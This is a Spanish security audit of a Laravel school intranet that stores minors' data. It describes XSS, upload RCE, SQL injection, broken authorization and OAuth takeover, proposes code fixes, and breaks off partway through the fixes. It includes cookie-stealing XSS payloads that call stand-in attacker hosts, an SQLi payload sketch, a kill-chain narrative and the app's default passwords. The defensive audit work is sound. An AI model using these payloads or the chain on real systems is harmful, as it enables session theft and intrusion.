# 🔐 Informe de Auditoría de Seguridad — Proyecto `grintranetedu2`

> **Rol:** Ingeniero de Ciberseguridad / Auditor de Código Senior (Laravel)
> **Fecha de auditoría:** 18/10/2026
> **Alcance:** Proyecto completo (`app/`, `routes/`, `resources/views/`, `config/`, `bootstrap/`, `.env`)
> **Stack:** Laravel ^12.0 · PHP ^8.2 · Spatie laravel-permission ^6.24 · Laravel Socialite · Livewire · Blade
> **Dominio:** Aplicación intranet educativa con **datos personales de menores** (notas, asistencias, conducta) → severidad evaluada con agravante RGPD/LOPDGDD.
> **Nota:** No se ha modificado ningún fichero del proyecto. Este informe es únicamente de lectura.

---

## 1. Resumen de Seguridad

### Veredicto global: ❌ **VULNERABLE**

| Métrica | Valor |
|---|---|
| Hallazgos totales confirmados | **26** |
| 🔴 Críticos | **5** |
| 🟠 Altos | **10** |
| 🟡 Medios | **7** |
| 🟢 Bajos / Observaciones | **4** |

**Síntesis ejecutiva:** La aplicación tiene una base estructural sólida (modelo `$fillable` consistente, `$hidden` correcto en `User`, CSRF activo, path traversal correctamente mitigado en `BackupController`, throttle en login), pero presenta **fallas sistémicas de autorización** (decenas de módulos CRUD accesibles a cualquier usuario autenticado sin verificación de rol o propiedad — fail-open), **5 vectores críticos explotables de forma encadenada**:

1. **Takeover de cuentas de profesores** por cualquier usuario autenticado (`TeacherController` sin autorización + esquema de contraseñas por defecto expuesto en el código).
2. **RCE remota vía subida de archivos** sin restricción de tipo a disco público ejecutable (`CalendarController` + XAMPP/Apache ejecutando PHP).
3. **XSS almacenado crítico** en mensajería (`{!! $message->body !!}` sin sanitizar) explotable contra el rol `admin`.
4. **Account takeover vía Google OAuth** por asociación automática por email sin whitelist de dominio.
5. **Tokens de reset de contraseña sin caducidad y filtrados en logs** (con `MAIL_MAILER=log`).

**Encadenamiento de explotación (kill-chain):** Un `alumno` registrado vía Google (C-05) → cambia contraseña de cualquier profesor (`/teachers/{id}`, A-01) → inicia sesión como profesor → envía mensaje con payload XSS al `admin` (C-01) → roba sesión de admin vía `{!! $message->body !!}` → RCE vía `CalendarController` (C-02) → compromete todo el servidor XAMPP.

---

## 2. Vulnerabilidades Detectadas

### 🔴 CRÍTICAS

---

#### 🔴 C-01 | XSS Almacenado en Mensajería (Stored XSS)

- **Categoría:** Inyección de Plantillas / XSS (3.2)
- **Archivo/Líneas:**
  - `app\Http\Controllers\MessageController.php:171-205` — `'body' => 'required|string'` y `'body' => $request->body` (el HTML del request se almacena tal cual).
  - `resources\views\messages\show.blade.php:104` — `<div class="rich-content">{!! $message->body !!}</div>`
  - `resources\views\messages\show.blade.php:119` — `<div class="rich-content">{!! $reply->body !!}</div>`

**Evidencia:**
```blade
{{-- resources\views\messages\show.blade.php:104 --}}
<div class="rich-content">{!! $message->body !!}</div>
```
```php
// app\Http\Controllers\MessageController.php:203-205
'body' => $request->body,   // sin sanitización en NINGÚN punto
```
**Impacto:** El editor es Quill (rich text) en el cliente, pero el servidor confía ciegamente en el HTML recibido. Un payload `<script>document.location='https://attacker/?c='+document.cookie</script>` enviado como `body` **se persiste en la BD y ejecuta en el navegador de cualquier participante del hilo**. Como `MessageController::store()` permite enviar a `role_id` (roles completos desde `create()`, que expone todos los usuarios por email en línea 163-166), **un `alumno` puede hacer XSS al `admin` al vuelo** → robo de cookie de sesión (`encrypt=false` en `config/session.php:50`, flag `Secure` no definido). Agravado por `event(new MessageSent(...))` (broadcast en tiempo real con el body sin procesar).

---

#### 🔴 C-02 | RCE vía Subida de Archivos sin Restricción a Disco Público Ejecutable

- **Categoría:** Manejo inseguro de archivos (3.3)
- **Archivo/Líneas:** `app\Http\Controllers\CalendarController.php:258-259, 301-305`

**Evidencia:**
```php
// app\Http\Controllers\CalendarController.php:253-259
$request->validate([
    'attachment_file' => 'nullable|file|max:10240',   // ⚠️ sin 'mimes', sin 'extensions'
]);
$attachmentPath = $request->file('attachment_file')->store('calendar_attachments', 'public');
```
**Impacto:** Regla `file` sin whitelist de tipos → **acepta cualquier fichero**. `hashName()` deriva la extensión del MIME *real* (`finfo`), por lo que subir un `.php` con `Content-Type: application/x-httpd-php` se guarda como `<hash>.php` en `storage/app/public/calendar_attachments/`, servido por Apache/XAMPP vía `/storage/...` → **Ejecución de código remota en el servidor**. Además permite `.svg`/`.html` con contenido activo (XSS same-origin). El download (`downloadAttachment`, línea 316-323) sirve el fichero a cualquier usuario autenticado sin verificar propiedad del evento. En XAMPP con `htdocs` servido por Apache con `mod_php`, es RCE directa.

---

#### 🔴 C-03 | Takeover de Cuentas de Profesores + Eliminación Masiva (Broken Access Control / IDOR)

- **Categoría:** Autenticación y Autorización (2.1)
- **Archivo/Líneas:** `app\Http\Controllers\TeacherController.php` (store/update/destroy/bulkDelete/import: ~99-351) · Ruta en `routes/web.php:70` **solo con `auth`** (sin `role:admin`)

**Evidencia:**
```php
// app\Http\Controllers\TeacherController.php:99-110
public function update(Request $request, $id)
{
    $teacher = User::role('profesor')->findOrFail($id);   // ⚠️ solo filtra por ROL DEL MODELO, no por ROL DEL USUARIO
    ...
    if ($request->filled('password')) { $data['password'] = Hash::make($request->password); }
    $teacher->update($data);
```
**Impacto:** El nivel de verificación es **cero** para el *actor* ($user). Cualquier usuario autenticado (incl. `alumno`) puede: cambiar email/contraseña de **cualquier profesor** (takeover de cuenta docente con todos sus privilegios), crear profesores, eliminarlos en bloque (`bulkDelete`) o promoverlos vía `import`. Es el hallazgo más grave del sistema de autorización (agrega C-06 que le da credenciales iniciales).

---

#### 🔴 C-04 | Tokens de Reset de Contraseña Sin Caducidad + Filtrados en Logs + Enumeración

- **Categoría:** Lógica de negocio / OWASP A07 (5.1/5.2)
- **Archivo/Líneas:** `app\Http\Controllers\PasswordResetController.php:29-33, 48-54, 70-76` · Ruta `password.update` (`routes/web.php:33`) sin `throttle`

**Evidencia (3 problemas confirmados):**
```php
// 1. Enumeración de usuarios por mensaje diferenciado (línea 31-33)
if (!$user) { return back()->withErrors(['email' => 'No encontramos un usuario con ese correo electrónico.']); }

// 2. Token sensible EN CLARO en el log (línea 52)
Log::info("Password Reset Link for {$request->email}: {$resetLink}");

// 3. Token SIN CADUCIDAD (línea 70-76) — no se compara created_at
if (!$reset || !Hash::check($request->token, $reset->token)) { ... }
```
**Impacto:** Con `MAIL_MAILER=log`, el enlace real se escribe en `storage/logs/laravel.log` y la respuesta dice literalmente *"Revisa storage/logs/laravel.log"*. Un atacante con cualquier error de fuga de logs (APP_DEBUG=true lo agrava) obtiene un link **válido indefinidamente** para resetear cualquier cuenta (incl IDs admin). No hay `expires_at` ni verificación TTL.

---

#### 🔴 C-05 | Account Takeover vía Google OAuth (asociación automática por email, sin whitelist de dominio) + Registro Abierto al Rol `alumno`

- **Categoría:** Autenticación / Bypass de auth de APIs (2.3)
- **Archivo/Líneas:** `app\Http\Controllers\SocialAuthController.php:24-26, 56-71`

**Evidencia:**
```php
// app\Http\Controllers\SocialAuthController.php:24-26
$user = User::where('google_id', $googleUser->id)
            ->orWhere('email', $googleUser->email)   // ⚠️ login por email sin verificar dominio ni email_verified
            ->first();
...
if ($user) { ...
    Auth::login($user);       // ⚠️ login directo sin contraseña
} else {
    $newUser = User::create([... 'email' => $googleUser->email ...]);
    $newUser->assignRole('alumno');       // auto-registro global a cualquier cuenta de Gmail
    Auth::login($newUser);
}
```
**Impacto:**
1. **Pre-hijacking de cuentas:** si el email de una cuenta interna se registra también como dirección de una cuenta Google ajena (o el usuario original cambia su email de Google y la dirección queda libre para un tercero), el tercero **inicia sesión SIN contraseña** como usuario interno y vincula su `google_id` permanentemente.
2. **Registro abierto:** cualquier persona con Gmail obtiene cuenta con rol `alumno` en la intranet (acceso a datos de menores de otros grupos vía A-04/A-05, mensajería masiva, pases, calendario). No hay whitelist de dominio (`@centro.edu.es`) ni check de `email_verified`.
3. Se agrava por que `hasDefaultPassword` entre línea 41-43 compara hashes de las contraseñas por defecto del sistema (confirmando que el esquema por defecto existe realmente en BD).

---

#### 🔴 C-06 | Contraseñas por Defecto Sembradas + Esquema Expuesto en Código Fuente

- **Categoría:** Configuración / OWASP A07 (4.2 / 5.1)
- **Archivo/Líneas:** `app\Http\Controllers\AuthController.php:30-32` · `app\Http\Controllers\StudentImportController.php:149-158` · `app\Http\Controllers\SocialAuthController.php:41-43`

**Evidencia:**
```php
// app\Http\Controllers\AuthController.php:30-32
$isInitialPassword = ($credentials['password'] === 'profesor')
    || (strtolower(trim($password)) === strtolower(trim($user->email)))
    || ($credentials['password'] === 'alumno1234');
```
```php
// app\Http\Controllers\StudentImportController.php:149-158 (aprox.)
$defaultPasswordHash = Hash::make('alumno1234');
```
**Impacto:** El esquema de contraseñas iniciales (`profesor` para docentes, `alumno1234` para alumnos, o el propio email) está **publicado en el repositorio**. Cualquier importación masiva crea cientos de cuentas con la misma contraseña conocida (`alumno1234`), y es accesible a cualquier profesor/usuario autenticado vía `StudentImportController::store` (ruta `groups/{group}/import` solo `auth`), lo que permite sembrar cuentas propias. La detección por `Hash::check(...email...)` en SocialAuthController confirma que hay cuentas reales con el email como contraseña. El middleware `EnsurePasswordIsChanged` atenúa pero **no elimina el riesgo**: entre logins y cambios, la cuenta es operable con el default.

---

### 🟠 ALTAS

---

#### 🟠 A-01 | SQL Injection en `ORDER BY` dinámico (10+ controladores)

- **Categoría:** Inyección SQL (1.1) — vía `sort` y `direction` del request sin whitelist.
- **Archivos/Líneas (patrón repetido):**
  - `app\Http\Controllers\MessageController.php:79, 117` — `$query->orderBy($sort, $direction);`
  - `app\Http\Controllers\IncidenciaController.php:40`, `StudentController.php:47-56`, `UserController.php:42-47`, `RoleController.php:27-28`, `ObservacionAlumnoController.php:32-37`, `DocumentoController.php:36-41`, `AulaController.php:30-34`, `ModuloController.php:45-49`, `ActividadController.php:34-39`, `ZonaController.php:27-33`, `SesionController.php:39-44`, `TeacherController.php:38-42`, `SchoolYearController.php:51-52`, `RecursoController.php:43`
  - Relacionado: `app\Http\Controllers\HallPassController.php:458, 460` — `orderByRaw('(...) ' . $direction)`

**Evidencia (verificada):**
```php
// app\Http\Controllers\MessageController.php:68-80
if ($sort === 'status') { ... } else { $query->orderBy($sort, $direction); }
// $sort = $request->get('sort', 'created_at');   → sin whitelist
// $direction = $request->get('direction', 'desc'); → sin whitelist
```
**Impacto:** Laravel **no sanitiza `$direction`** (se concatena como sufijo raw en el `ORDER BY`). Payload tipo `?sort=created_at&direction=asc,(case+when+(select+...)...)` permite **blind/error-based SQLi** (paginación de datos, exfiltración de todo el esquema: contraseñas hasheadas, tokens reset, notas de menores). En `HallPassController` la concatenación es literal sobre la query completa. Severidad: **Alta** (requiere autenticación, pero afecta a todos los usuarios).

---

#### 🟠 A-02 | Autorización fail-open sistémica (módulos CRUD accesibles por cualquier rol autenticado)

- **Categoría:** Autenticación/Autorización (2.1) — el patrón de check `if ($user->hasRole('profesor')) { ...restrict... }` deja que **cualquier otro rol pase sin abort**.

**Archivos/líneas clave (todos verificados):**

| Fichero:línea | Acción | Impacto con rol `alumno` |
|---|---|---|
| `StudentController.php:185-193, 92, 140-145, 651, 671` | update/destroy/bulk | Crear/editar/eliminar/bulk alumnos, cambiar su password/email, reasignar grupos |
| `SesionController.php:75-92, 131-149` | store/guardarAsistencia | Crear sesiones y pasar lista de cualquier grupo |
| `AusenciaController.php:88-112` | store | Registrar ausencias a nombre de cualquier docente |
| `CalendarController.php` (store/update/destroy/move) + `routes/web.php:263-275` | CRUD | Borrar eventos/calendarios del centro sin rol |
| `CalendarManagerController.php:81-91` | destroy | Borrar calendarios completos |
| `ActividadController.php:74-94, 122-139` | CRUD | Manipular actividades y **pesos de evaluación** |
| `RecursoController.php:98-102`, `AulaController.php:125-128` | destroy | Borrar recursos/aulas |
| `AulaController.php:177` (import sin `authorizeAdmin`) | import | Importación masiva de aulas con XSS vía `nombre` (ver A-04) |
| `ScheduleTemplateController.php` | CRUD/copy | Borra plantillas y time slots → rompe sistema de guardias |
| `CuadernoController.php:88-102` | alumno/{id} | Expediente completo (faltas, notas, conducta) de **cualquier alumno** |
| `NotaController.php:31-43, 111-119` | index/boletín | Consulta de notas y boletines por `modulo_id` sin verificación (IDOR lectura) |
| `RubricaController.php` | CRUD | Fabricar/borrar rúbricas |
| `MessageController.php:183-193, 214-222` | store/inyectar | Inyectar respuestas en hilos ajenos + **restaurar mensajes borrados de terceros** + mailing masivo |
| `GuardiaController.php:106-124` | confirmar | Auto-asignar guardias a su nombre o a docentes arbitrarios |
| `app\Livewire\ParteDiario.php:82-110` | confirmarGuardia | Alterar `guardia_user_id`/`guardia_confirmed_at` de **cualquier ausencia** sin check |
| `HallPassController.php:300-309` | destroy | Cualquier profesor borra pase de cualquier alumno (borra constancia de absentismo) |
| `StudentImportController.php:27-61` | store | Importar alumnos con password por defecto a cualquier grupo (con C-06) |

**Impacto consolidado:** compromiso de integridad de expedientes académicos de menores + acceso a datos sensibles (conducta, absentismo) + manipulación del sistema completo de guardias/pases. Es el problema estructural nº1: usar policies/gates en lugar de checks dispersos.

---

#### 🟠 A-03 | Mass assignment con `$request->all()` y campos sensibles en `$fillable`

- **Categoría:** Asignación masiva (2.2)
- **Archivos/Líneas (verificados):**
  - `app\Http\Controllers\SesionController.php:127` — `$sesion->update($request->all());` (`Sesion.php` tiene `profesor_id` en `$fillable`) → **un profesor/user puede reasignar la autoría de la sesión a otro docente**.
  - `CriterioEvaluacionController.php:43`, `ResultadoAprendizajeController.php:43`, `RecursoController.php:68/93`, `ZonaController.php:60/83`, `ObservacionAlumnoController.php:62-64` — mismo patrón `$request->all()` mitigado parcialmente por `$fillable` acotado (sin crítico directo, pero frágil: al añadir columna, se vuelve explotable).
  - `DocumentoController.php:120-129` — `$data = $request->except('archivo')` permite cambiar `user_id` (re-asignación de autoría).
  - `Perfil/Modelo User` — `'password', 'google_id', 'must_change_password', 'active_role'` en `$fillable` (`User.php:30-46`): hoy los paths lo controlan, pero **no debería existir** un `$fillable` que incluya estos campos (práctica peligrosa).

> **Nota sistemática positiva:** Ninguno de los 42 modelos usa `$guarded = []` (todos usan whitelist `$fillable`). ✔

---

#### 🟠 A-04 | XSS Almacenado en Árbol de Categorías (renderTree, sin escapar) + XSS vía título en layout

- **Categoría:** Inyección de Plantillas / XSS (3.2)
- **Archivos/Líneas:**
  - `resources\views\categorias\_tree.blade.php:4-37` — función `renderTree` concatena `$item->nombre` / `$item->titulo` (líneas 15 y 31) **sin `e()`**; renderizado con `{!! renderTree($tree) !!}`. Datos origen: `nombre` de categorías y `titulo` de documentos.
  - `resources\views\layouts\app.blade.php:973, 1006` — `{!! $defaultModuleTitle !!}` donde el `default` del `match` es `View::getSection('title')`, y vistas como `aulas/show.blade.php:2` y `actividades/show.blade.php:2` **setean el title con datos de BD** (`$aula->nombre`, `$actividad->titulo`).
  - Conexión con A-02: `AulaController::import` no tiene check admin → cualquier usuario importa aulas cuyo `nombre` se ejecuta como XSS en la topbar **de todas las páginas** que visiten usuarios que abran la vista `aulas.show`.

**Impacto:** XSS almacenado en páginas transversales al layout (todo el centro), explotable por usuarios con permisos normales. Payload clásico: crear categoría/aula llamada `<img src=x onerror=fetch('https://atk/'+document.cookie)>`.

---

#### 🟠 A-05 | DOM-XSS de ClientSide en Calendario (`innerHTML` con datos de usuario)

- **Categoría:** XSS (3.2)
- **Archivo/Líneas:** `resources\views\calendar\index.blade.php:625-637`

**Evidencia:**
```javascript
container.innerHTML = events.map(e =>
  `<div ...>${e.title} ${e.description} ${e.attachment_url}...</div>`).join('');
```
**Impacto:** `title`/`description` de eventos son controlados por los creadores de eventos (por defecto permisos amplios según `routes/web.php:263-270`). Al renderizar con `innerHTML` → ejecución de `<img src=x onerror=...>`/`<svg onload=...>`. Combinado con `importIcs` (permite importación de ficheros ICS con títulos/descripciones masivas, sin `max` de tamaño → además DoS por memoria).

---

#### 🟠 A-06 | Fuga de Credenciales de BD y Comando en Flash de Error (`BackupController`)

- **Categoría:** Exposición de datos sensibles (4.2)
- **Archivo/Líneas:** `app\Http\Controllers\BackupController.php:66, 101, 116-117` (verificado directamente)

**Evidencia:**
```php
$passwordArg = '--password=' . escapeshellarg($db['password']);
$command = "\"$mysqldump\" --user={$db['username']} {$passwordArg} --host=... 2>&1";
exec($command, $output, $result);
...
$fullDebug = "CMD: $command | RESULT: $result | OUTPUT: $errorMsg";
return redirect(...)->with('error', 'Error al crear backup. Depuración: ' . $fullDebug);
```
**Impacto:** La **contraseña de la BD aparece en HTML** (flash `error`) y en los accesos del proceso. Uso de `--password=...` en cmdline → visible en `ps`/historial/procesos Windows. Riesgo de eskeralación si un admin comprometido por XSS (C-01) lee la flash o si APP_DEBUG filtra traces. La inyección de comandos se mitiga por provenir de `config()` (no del request) — **pero depende de que config() no se comprometa con env dinámico**.

---

#### 🟠 A-07 | Ruta de estado por GET sin CSRF (ActiveSchoolYear) y checks de Spatie mal escritos

- **Categoría:** CSRF/autorización (4.4 / 2.1)
- **Archivos/Líneas:**
  - `app\Http\Middleware\ActiveSchoolYear.php:20-31` — `?set_school_year_id=` cambia el curso activo de sesión vía **GET** (CSRFable con `<img src=...>` en navegadores viejos; un invitado con la URL también puede cambiarlo).
  - `app\Http\Controllers\TicBookingController.php:188, 205` — `!Auth::user()->hasRole('admin|directiva')` — **Spatie interpreta el string 'admin|directiva' como UN único nombre de rol** (se debe usar `hasAnyRole(['admin','directiva'])`) → check siempre `false` → fail-closed pero roto (el admin tampoco puede editar reservas de terceros) — antipatrón de mantenimiento que genera bypasses cuando se refleja en roles futuros.
  - `app\Livewire\GestionAusencias.php:194,217,338` vs `routes/web.php:99,135` — lista de roles divergente (`'directivo'` en código, no en rutas) → **drift de roles** entre capas.
  - `resources\views\messages\show.blade.php:104` (ya en C-01) etc.

**Impacto:** Riesgo medio-bajo en solitario, pero incrementa la probabilidad de bypasses en futuras modificaciones.

---

#### 🟠 A-08 | Falta de HTTPS forzado + Cookies de sesión sin flag Secure + `session.encrypt=false`

- **Categoría:** Configuración (4.x)
- **Archivos/Líneas:** `.env` (APP_URL=http://localhost, SESSION_SECURE_COOKIE no definido), `config/app.php:55`, `config/session.php:50,172`, no hay `URL::forceScheme('https')` en el codebase, no hay trustProxies/HSTS.

**Impacto:** En despliegue sin reverse-proxy TLS, cookies y credenciales viajan en claro. `session.encrypt=false` + `http_only=true` (OK) — mitigado en parte, pero sin Secure flag la cookie sale texto plano en cualquier request http.

---

#### 🟠 A-09 | `.env` accesible de forma relativa al docroot en XAMPP (deploy real visto en MANUAL_DESPLIEGUE_VPS.md)

- **Categoría:** Configuración (4.x)
- **Ubicación:** `.env` en **raíz del proyecto** junto a `MANUAL_DESPLIEGUE_VPS.md`. En XAMPP (`C:\xampp\htdocs\grintranetedu2`), si el DocumentRoot vhost apunta a la **raíz del proyecto** en lugar de `public/`, ficheros como `.env`, `composer.json`, `storage/`, `.git/` quedan **descargables por HTTP**.

**Impacto:** Exfiltración completa: credenciales BD, APP_KEY (descifrado de cookies cifradas), credenciales SMTP, secrets de Google OAuth. Severidad: **positivamente confirmada la estructura** (dirección vhost no se puede auditar desde código) → tratar como Alto si el vhost no apunta a `/public`.

---

#### 🟠 A-10 | Falta de Rate Limiting en rutas críticas (5.x y 5.x-reset)

- **Categoría:** Rate limiting ausente (5.2)
- **Archivo/Líneas:** `routes/web.php:25-37`
  - ✅ `/login` POST: `throttle:6,1` presente
  - ✅ `/forgot-password` POST: `throttle:3,1` presente
  - ❌ **`password.update` (POST reset): SIN throttle** → brute-force de tokens sin límite (con C-04: token no caduca)
  - ❌ **`auth/google` y `/auth/google/callback`: SIN throttle** ni restricción de dominio (agota/OAuth probing)
  - ❌ `per_page` sin límite en 6+ listados (`UserController:53`, `RoleController:34`, `AulaController:40`, `RecursoController:43`, `IncidenciaController:40`, `InventoryController:31`): `?per_page=99999999` → DoS de BD.

---

### 🟡 MEDIAS

---

#### 🟡 M-01 | Enumeración de usuarios en reset + `must_change_password` revela esquema
`PasswordResetController.php:31-33, 79-81` — mensajes diferenciales permiten enumerar emails existentes. Combinado con C-06.

#### 🟡 M-02 | Falta de doble verificación de email en login social + sin check `email_verified`
`SocialAuthController.php:22-26` — `Socialite::user()` sin filtro `emailVerified` ni comparación contra dominio del centro.

#### 🟡 M-03 | Subida de adjuntos legítimos pero con tipos peligrosos (macros / malware-distribución)
`DocumentoController.php:73,117` (`mimes: pdf,doc,docx,xls,xlsx,ppt,pptx,odt,ods,odp,zip,rar,...`) y `Livewire\GestionAusencias.php:130,228` — validación de contenido correcta ✔ pero: (a) disco `public` → accesible sin auth (solo obstáculo: nombre hash 40 chars); (b) se sirven `target="_blank"` inline (`documentos/index.blade.php:70`) → precisa bloquear inline zips/macros (phishing); (c) sin blacklist explícita de `.html/.svg` (permitida en listado Documento? — sí, `"png,jpg,jpeg"` solo, sin svg ✔).

#### 🟡 M-04 | `predefined_avatar` en perfil sin whitelist
`ProfileController.php:84-110` — almacenamiento de string arbitrario (`'predefined_avatar'`) como avatar (se renderiza en `<img src>`); además avatares públicos.

#### 🟡 M-05 | Cambio de contraseña sin verificar la actual
`ProfileController.php:108-118` — `$request->filled('password') → update` sin `current_password` → si el atacante roba sesión (C-01), renueva contraseña de forma silenciosa y persiste el acceso.

#### 🟡 M-06 | Validación débil en parámetros funcionales
- `HallPassController.php:559-561` — `'group_id' => 'required'` sin `exists` ni `numeric`.
- `HallPassController.php:189-206` — `$request->boolean('force')` aceptado del cliente para sobrepasar límites de pases (abuso funcional por profesores).
- `AulaController/GroupController/StudentController/TeacherController (import)` — `file` sin `mimes`/`max`, parser por extensión `getClientOriginalExtension()` (parse-only, sin RCE directo; riesgo de DoS por ficheros gigantes y `set_time_limit(300)`).

#### 🟡 M-07 | Log de reset + mensaje usuario con `MAIL_MAILER=log` envía el enlace a logs accesibles
`PasswordResetController.php:48-54` — duplicado funcional del C-04 (severidad operativa distinta: el correo real **nunca se envía**).

---

### 🟢 BAJAS / OBSERVACIONES

| ID | Archivo:línea | Detalle |
|---|---|---|
| B-01 | `AuthController::login:29-40` | Detección de contraseñas iniciales por valores literales en comparación — preserva esquema; mitigado por `must_change_password` |
| B-02 | `AuthController.php:45-47` | Recomendable gestionar bloqueo temporal por cuenta (Laravel `RateLimiter`/`LockoutEvent`) además del `throttle` por IP ya presente |
| B-03 | `MessageController.php:48-66` | `like "%{$search}%"` sin escapar comodines % y _ (DoS de búsqueda ligero, no SQLi — binding correcto) |
| B-04 | `AusenciaController.php:163` | Mezcla `zona_id` con `exists:aulas,id` pero entidad real es `Zona` — incoherencia funcional |

---

### ✔ Hallazgos POSITIVOS (defensas correctas verificadas)

1. **CSRF Laravel activo** en todas las rutas web (sin exemptions), sin `VerifyCsrfToken` manipulado — ✔
2. **0 rutas GET destructivas** en `routes/web.php` (delete por DELETE/POST) — ✔
3. **`BackupController::download/destroy`** usan `basename()` + `realpath()` + `str_starts_with()` → path traversal correctamente mitigado — ✔
4. **Ningún modelo con `$guarded = []`** (42/42 usan `$fillable`) — ✔
5. **`User::$hidden`** oculta `password` y `remember_token` (`User.php:90-93`) — ✔
6. **`AuthController::login` throttle:6,1** + session regenerate tras login — ✔
7. **`ProfileController::switchRole`** valida que el usuario *posee* el rol antes de activarlo → sin escalado por sesión — ✔
8. **`GestionAusencias::deleteAusencia`** (Livewire) delega en `AusenciaService` con checks de ownership y restricciones temporales correctas — ✔
9. **Pattern `$request->except('criterios_ids')`** en ActivityController — parcial, no perfecta pero mejor que `$request->all()` sin filtro.
10. **No hay credenciales hardcodeadas en `config/`** (todo via `env()`) — ✔ (el `-password` del backup se saca de `$db['password']` config, no literal).

---

## 3. Código Corregido

> **Principio:** Cada bloque aplica las mejores prácticas Laravel 12 (Policies + FormRequests + whitelist + validación real). Se marca el cambio respecto al original. Los ficheros van agrupados por remediación de severidad 🔴→🟠.

---

### C-01 fix › XSS almacenado en mensajería (sanitización server-side con HTMLPurifier)

**`composer.json` (nueva dependencia):**
```json
"ezyang/htmlpurifier": "^4.17"
```

**`app\Services\HtmlSanitizer.php` (nuevo fichero):**
```php
<?php

namespace App\Services;

class HtmlSanitizer
{
    public static function clean(?string $html): string
    {
        if ($html === null) return '';

        $config = \HTMLPurifier_Config::create([
            'Attr.AllowedFrameTargets' => ['_blank'],
            // Whitelist estricta: etiquetas de texto, listas y tablas básicas (formato Quill)
            'HTML.Allowed' =>
                'p,br,b,strong,i,em,u,s,ol,ul,li,h1,h2,h3,blockquote,pre,code,'.
                'a[href|target|rel],span[style|string],'.
                'table,thead,tbody,tr,td,th'.
                ',img[src|alt|width|height]',
            'CSS.AllowedProperties' =>
                'font-weight,font-style,text-decoration,color,background-color,margin,padding,text-align',
            'URI.AllowedSchemes' => ['http' => true, 'https' => true, 'mailto' => true],
            'HTML.SafeIframe' => false,
            'AutoFormat.RemoveEmpty' => true,
        ]);
        $config->set('HTML.DefinitionID', 'intranet-richtext');
        $config->set('HTML.DefinitionRev', 2);

        $purifier = new \HTMLPurifier($config);
        return $purifier->purify($html);
    }
}
```

**`app\Http\Controllers\MessageController.php:169-181` (store — aplicar en CREACIÓN):**
```php
    public function store(Request $request)
    {
        $validated = $request->validate([
            'subject' => 'nullable|string|max:255',
            'body'    => 'required|string|max:20000',
            'parent_id'   => [
                'nullable', 'exists:messages,id',
                // ✅ NUEVO: solo podeis responder en hilos donde participes (fix IDOR A-02 / mensajes)
                function ($attribute, $value, $fail) use ($request) {
                    if (!$value) return;
                    $thread = \App\Models\Message::find($value);
                    if (!$thread
                        || !in_array(auth()->id(), [$thread->sender_id, $thread->receiver_id])) {
                        $fail('No tienes permiso para responder a esta conversación.');
                    }
                },
            ],
            'receiver_id' => 'required_without_all:role_id,group_id|nullable|exists:users,id',
            // ✅ NUEVO: mailing solo para profesores/directivos + límites por mensaje (anti-abuso A-02)
            'role_id'  => [
                'nullable', 'exists:roles,id',
                Rule::when(fn () => $request->filled('role_id'),
                    fn () => auth()->user()->hasAnyRole(['profesor', 'admin', 'directiva']), 
                ),
            ],
            'group_id' => [
                'nullable', 'exists:groups,id',
                Rule::when(fn () => $request->filled('group_id'),
                    fn () => auth()->user()->hasAnyRole(['profesor', 'admin', 'directiva']),
                ),
            ],
        ]);

        // ✅ NUEVO (C-01 fix): sanitizar body ANTES de guardar — elimina <script>/event handlers
        $validated['body'] = HtmlSanitizer::clean($validated['body']);
        $validated['subject'] = strip_tags($validated['subject'] ?? '(Sin asunto)');

        // ✅ NUEVO: Rate limit por usuario: max 50 mensajes/h con rol alumno
        if (!auth()->user()->hasAnyRole(['profesor','admin','directiva'])) {
            if (cache()->get('msg_count_'.auth()->id()) > 50) {
                return back()->with('error', 'Has alcanzado el límite de mensajes por hora.')->withInput();
            }
            cache()->increment('msg_count_'.auth()->id(), 1, now()->addHour());
        }
        // ... resto del método idéntico (sender/recipientIds/loop/Message create)
```

**`resources\views\messages\show.blade.php:104,119` (doble defensa en render):**
```blade
{{-- El body ya se saneó al guardar (C-01); se mantiene {!! !!} para el estilo enriquecido,
     reforzado aquí con una segunda pasada de purificación (defensa en profundidad). --}}
<div class="rich-content">{!! \App\Services\HtmlSanitizer::clean($message->body) !!}</div>
...
<div class="rich-content">{!! \App\Services\HtmlSanitizer::clean($reply->body) !!}</div>
```

---

### C-02 fix › RCE por subida en CalendarController (validación real + disco privado + authz)

**`app\Http\Controllers\CalendarController.php:` store, update, y nuevos métodos helper:**
```php
    // ✅ NUEVO helper: whitelist estricta por MIME real + extensión intencionada
    private function validateAttachment(Request $request): array
    {
        return $request->validate([
            'attachment_file' => [
                'nullable',
                'file',
                'max:10240',
                // Whitelist por CONTENT (finfo), no por extensión del cliente:
                // 'mimes' valida la extensión GUESSEADA por Laravel a partir del MIME real (no del cliente);
                // 'mimetypes' añade la segunda validación independiente sobre el Content-Type real.
                'mimes:pdf,png,jpg,jpeg,gif,webp,doc,docx,xls,xlsx,ppt,pptx,odt',
                'mimetypes:application/pdf,image/png,image/jpeg,image/gif,image/webp,'
                    .'application/msword,'
                    .'application/vnd.openxmlformats-officedocument.wordprocessingml.document,'
                    .'application/vnd.ms-excel,'
                    .'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,'
                    .'application/vnd.ms-powerpoint,'
                    .'application/vnd.openxmlformats-officedocument.presentationml.presentation,'
                    .'application/vnd.oasis.opendocument.text',
            ],
        ]);
    }
```

**Cambios en `store()` y `update()`:**
```php
        // ❌ ANTES: validate(['attachment_file' => 'nullable|file|max:10240']);
        $this->validateAttachment($request);
        ...
        // ❌ ANTES: ->store('calendar_attachments', 'public')   ← disco público ejecutable
        $attachmentPath = $request->file('attachment_file')->store('calendar_attachments');  // disk privado 'local'
```

**`config\filesystems.php` (nuevo disco privado + URL firmada):**
```php
    'disks' => [
        // ... 'local' y 'public' existentes ...

        // ✅ NUEVO: disco privado para adjuntos de calendario (no accesible por /storage)
        'private' => [
            'driver' => 'local',
            'root' => storage_path('app/private'),
            'serve' => false,
            'throw' => false,
        ],
    ],
```

**`app\Http\Controllers\CalendarController.php:316-323` (descarga con control de acceso real):**
```php
    public function downloadAttachment(CalendarEvent $event)
    {
        abort_unless($event->attachment, 404);

        // ✅ NUEVO: solo creador del evento, participants o admin/directiva
        $user = auth()->user();
        abort_unless(
            $user->hasAnyRole(['admin','directiva']) || $event->user_id === $user->id,
            403
        );

        return Storage::disk('private')->download($event->attachment);
    }
```

---

### C-03 / A-02 fixes › Patrón de autorización centralizado (Policy + `can()` y fail-closed)

**`app\Http\Controllers\TeacherController.php` — re-escribir todos los métodos protegidos:**
```php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class TeacherController extends Controller
{
    /**
